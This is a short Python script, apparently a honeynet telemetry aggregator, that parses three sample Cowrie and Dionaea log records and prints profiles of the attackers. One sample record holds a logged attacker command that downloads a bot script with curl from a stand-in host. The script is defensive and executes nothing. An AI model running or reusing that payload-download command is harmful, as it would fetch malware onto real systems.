#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Honeynet Telemetry Aggregator & Attacker Profiler
Author: Toprak Ahmet Aydoğmuş
"""

import json

SAMPLE_LOGS = [
    '{"sensor": "cowrie-edge-1", "src_ip": "198.51.100.89", "event": "login.failed", "user": "root", "pass": "admin123"}',
    '{"sensor": "cowrie-edge-1", "src_ip": "198.51.100.89", "event": "command.input", "cmd": "curl -O http://198.51.100.99/bot.sh"}',
    '{"sensor": "dionaea-edge-2", "src_ip": "192.0.2.77", "event": "smb.scan", "port": 445}'
]

def profile_attacker():
    print("[*] Processing Distributed Honeynet Events...")
    for l in SAMPLE_LOGS:
        ev = json.loads(l)
        if "cmd" in ev:
            print(f"  [!] ATTACKER ACTION [{ev['src_ip']}]: Executed Payload Download -> {ev['cmd']}")
        else:
            print(f"  [+] Interaction Captured from {ev['src_ip']} on {ev['sensor']} (Event: {ev['event']})")

if __name__ == "__main__":
    profile_attacker()
